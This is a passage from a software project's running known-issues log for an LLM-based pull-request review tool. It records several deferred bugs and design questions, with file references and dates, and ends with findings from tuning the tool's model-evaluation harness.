  and the earlier entry blaming live OpenRouter latency identified an aggravator, not the cause.
  It is load-dependent: fourteen consecutive clean runs happen, then two bad ones in a row.
  Two candidate fixes, neither taken because both are wider than the change that found this:
  write the trace inside the same transaction as the status, or have `waitForPrRuns` throw on
  timeout and poll `run_traces` too. The second changes a helper five files share, and turning a
  soft return into a throw would surface every other latent race at once — which may be right,
  but is its own change. Until then, a `traceOf` 404 is this race, not a regression.

- **`IntentService.derive` never reads its own cache, and Step 12 of the plan assumes it does.**
  `modules/intent/service.ts:68-117` goes straight from `getPull` to `resolveFeatureModel` to
  `completeStructured`; `repo.getIntent` is called only by `get()`. So every review run pays the
  classifier again even when a fresh `pr_intent` row is sitting there, and a three-agent
  re-review of an unchanged PR buys three identical derivations of the same text. That
  contradicts `plans/05-intent-layer.md` Step 12, which justifies storing the cost on `pr_intent`
  rather than on `agent_runs` with *"one derivation serves every agent and every re-review until
  someone hits Recompute"* — the sentence is true of the storage and false of the code.
  Deliberately **not** fixed on 2026-08-05 while fixing the classifier's 502: `derive` is the
  method the Recompute button calls, so it cannot simply return the cached row, and the
  discriminator between "cached and still valid" and "cached and stale" is the PR's head sha,
  which `pr_intent` does not carry. That is a migration plus a staleness rule plus a decision
  about what a `force` flag does to the route — a design call, not a bug fix. Whoever takes it:
  the cheapest correct shape is a `head_sha` column written by `upsertIntent`, `derive({ force })`
  from `POST /pulls/:id/intent`, and the pre-pass in `run-executor.ts:88-100` passing no `force`.
  Raised 2026-08-05.

- **`GET /pulls/:id/blast` can still reach the clone when `REPO_INTEL_ENABLED=false`.**
  `BlastService.getBlast` gates on `repoIntel.getIndexState`, which reads `repo_index_state` and
  ignores the flag, while `getBlastRadius` checks the flag *before* `tryPersistentBlast` and falls
  through to the clone-reading, `codeIndex.symbols` path (`modules/repo-intel/service.ts:238-306`).
  So a repo indexed earlier and then run with the flag off passes the gate and does whole-repo
  scanning on the request path — the thing acceptance criterion 4 of `plans/07-blast-radius.md`
  forbids. Not fixed on 2026-08-09 because both fixes are wider than the step that found it:
  putting `config` on `BlastContainer` (step 5 deliberately keeps it to three methods), or having
  `getIndexState` report `degraded` when the flag is off, which changes a facade every module
  reads. Raised 2026-08-09.
- **A feature reusing a `FeatureModelId` inherits that id's provider, not the one you have a key
  for.** `risk_brief` defaults to `openai/gpt-4.1`
  (`vendor/shared/contracts/platform.ts:55-62`), and this machine's `~/.devdigest/secrets.json`
  holds only `GITHUB_TOKEN` and `OPENROUTER_API_KEY` — so `POST /pulls/:id/blast/summary` answers
  `500 config_error: OPENAI_API_KEY is not configured` until the workspace picks a model under
  Settings → Models. Verified live 2026-08-09. Fail-closed and correct, but it means the Explain
  button is dead on a fresh install; worth deciding whether the registry defaults should follow
  the keys that actually exist. Raised 2026-08-09.

- **A `vitest run` immediately after an Edit appeared to execute the pre-edit module once.**
  On 2026-08-09 the first run of a new test file reported the empty-agent-list guard missing
  (`{ files: 1, reviews: [] }` returned instead of a throw) while `pnpm typecheck` and the full
  unit suite had already passed against the new code; the identical command 8 seconds later was
  green, and stayed green. Vitest 2.1.9, no `--no-cache`. Not reproduced deliberately, so it may
  equally have been something else — but if a test fails against code you are certain you wrote,
  re-run once before debugging it. Raised 2026-08-09.

- **A document written under `.devdigest/` gets `kind: "other"`.** `kindForRoot` decides on the
  first segment, and `.devdigest` is none of `specs` / `docs` / `insights`, so every authored
  document carries the fourth badge whatever folder it is put in. `AC-61` makes `.devdigest` the
  root and `AC-52` makes the row show the sub-path (`specs/public-api.md`), so a reader sees the
  word "specs" on the row and the badge "other" beside it. No criterion asks for anything else and
  nothing was invented; flagged 2026-08-14 as a question for the design pass, not a defect.
  - **Answered 2026-08-14, same day, by the human: it is not `other`.** The kind now comes from
    the folder under `.devdigest/`, so that document reports `specs`. The original bullet above is
    left standing because it records why the question was worth asking. See "`.devdigest` labels a
    document from the folder BELOW the root" under Codebase Patterns for the rule as built.
- **The rate limit is per route with the default keying, not per workspace.** The NFR says "per
  workspace"; `@fastify/rate-limit` is registered globally in `app.ts` with its default keying and
  is disabled entirely under `NODE_ENV=test`, so `{ max: 30, timeWindow: '1 minute' }` on each write
  route is the same population for a local-first single-workspace install and is untestable by the
  integration suite. A workspace-keyed limiter was explicitly out of scope for plan 09.
- **Two more allowed-refs holes are known and unfixed, both outside the round-3 brief.** (1) A
  spec block's `refs` is its own path on the argument that the path leads the section and a
  prefix cut keeps it — but `truncateToBudget` guarantees only ONE code point, so a spec cut to
  less than its own `### <path>` header licenses a path the prompt never printed. Measured
  2026-08-16: with one 4000-char spec at `plans/a-long-plan-name.md`, a budget of
  `fixedBlocks + 71…98` reports `specs: truncated` and leaves that path allowed and unprinted;
  at +70 the remainder goes non-positive and the spec is `dropped` instead, which is why the
  window is narrow rather than absent. (2) `wrapUntrusted` rewrites
  `</untrusted>` to `<\/untrusted>` inside the content, so a path or endpoint label containing
  that literal is registered in one form and printed in another. Both were noticed on 2026-08-16
  while fixing the third break of the invariant, and both are the same family: a caller declaring
  a name printed without asking the rendered text. The enforcement test would catch either the
  moment a fixture expresses it.
  - **Half-answered 2026-08-16, round 5.** (2) is closed FOR SPECS and only for specs: the escape
    now runs per spec file in `buildBlocks`, on the path and the body separately, so `refs[0]` is
    the string the block prints whatever the path contains. It cannot arise there anyway —
    `sanitizeMarkdownRepoPath`'s character class (`plan-refs.ts:51`) has no `<` or `>`. The BLAST
    half is untouched and still open: `blastBlock` adds `part(symbol.file)` and
    `part(endpoint.label)` to `refs` raw while `wrapUntrusted` escapes the printed line, and those
    strings come from the indexer over repository content, which has no such character class.
    (1) is untouched. Both were out of the round-5 brief.

- **Does `MAX_ENV_VARS = 12` need to disclose its overflow the way `package_scan` does?**
  `server/.env.example` in this repository declares 13 keys, so a project of exactly this shape
  already loses one variable off the tail with nothing on the screen saying so. The package
  ceiling has AC-90 and `package_scan.found - shown` for precisely this; the env list has no
  equivalent and no criterion asking for one. Raised 2026-08-17 while sourcing the caps in
  `modules/onboarding/constants.ts`; deliberately not decided there, because the number is the
  spec's to move and the disclosure would be a new field in a contract two other slices read.
  - **Answered 2026-08-17 by the coordinator, and the answer was not the number.** The ceiling
    stays at 12; `Onboarding.env_vars_truncated` was added instead, in the shape
    `sample_truncated` already had. Raising the cap would have moved the cliff to a repository
    with 25 variables and kept the silence — the defect was never the number, it was that the
    cut was invisible. Worth generalising when the next cap comes up for review: this feature
    discloses a cut three ways (`package_scan.found`/`shown`, `sample_truncated`,
    `env_vars_truncated`) and a fourth cap without disclosure is now the outlier, not the norm.

- **The junk-path filter on chain roots is precautionary, not measured.** P2 of `plans/15` skips a
  candidate root that `isJunkPath` rejects, on the reasoning that 20 chains reach much further down
  the rank list than 5 roots did and would start seeding on tests and `.d.ts` files. On
  `Holubinka/dev-digest` the filter fired **zero** times: 20 chains were collected from the first 46
  rank candidates and none of them was junk (2026-08-18). The unit case in
  `test/repo-intel-critical-paths.test.ts` pins the behaviour, but no real repository has yet shown
  the filter changing an answer — a monorepo with a large test tree would be the one to check.

- **A cheap model reports one real issue as several adjacent findings, and the eval harness was
  penalising it for its own correct answer.** Running `plans/16`'s eval pipeline for real
  (`gpt-4o-mini`, `claude-haiku-4.5`, 14 real cases, a dozen live batches) surfaced a pattern no
  unit test had: a single vulnerability — one SSRF `fetch` call, one route handler — regularly
  comes back as 2-3 `Finding` objects with slightly different, overlapping `start_line`/`end_line`.
  `creditFindings` (AC-40) only credits the first; the rest became "noise" the case could never
  shed, so a model that had genuinely found the right thing still failed the case on precision.
  **Two prompt-side fixes were tried first, and both made the metrics WORSE, not better**: an
  instruction to count lines exactly from the hunk header made the model more cautious overall and
  recall collapsed (57%→14%); an instruction to "merge overlapping findings into one" made the
  model compute the merged range itself, and it sometimes got that arithmetic wrong (`end_line` <
  `start_line`, or a "merge" that silently widened to the whole file — the exact whole-file-noise
  failure mode being avoided). Both are the same shape of mistake: asking a cheap model to do a
  harder meta-task on its own output spends the attention budget the review itself needed. The fix
  that held was in code, not the prompt — `dedupeOverlapping` in
  `server/src/modules/eval/scoring.ts` collapses findings that overlap EACH OTHER on the same file
  into one (union of their range) before crediting; `citation_accuracy` still reads the raw,
  pre-dedup count, so this touches precision and `pass` only. Findings that do not touch stay
  separate noise — that is what still catches a prompt told to report more (D7/AC-73). Recorded
  as `SPEC-05-eval-pipeline.md` D5a.

- **Ground-truth `expected_output` citations inherited whatever line the ORIGINAL finding cited,
  and several were themselves wrong.** Building the eval set from real accept/dismiss decisions
  (per D11 — no seeded cases) carries forward whatever `start_line`/`end_line` the first review run
  put on the finding. Hand-counting from the hunk header (`@@ -a,b +c,d @@`, every non-`-` line
  increments) turned up five cases citing the wrong line by 1-4, in inconsistent directions, and
  two `must_not_flag` cases whose range was nearly the whole file (`gate.sh` 1-156, `report.sh`
  1-414) because the original finding's own citation was that broad — a range that broad passes
  only when the model finds NOTHING anywhere in the file, a much harsher bar than "don't re-flag
  this one spot." Fixing the five citations narrowed the run-to-run spread on repeated batches
  noticeably (three repeats after the fix landed within one case of each other; before, three
  repeats on the unfixed set had spanned 4/14 to 8/14) — an imprecise ground truth doesn't just bias
  the average, it widens the variance, because two independently-imprecise citations (the original
  finding's and the model's on replay) miss each other in different directions on different runs.
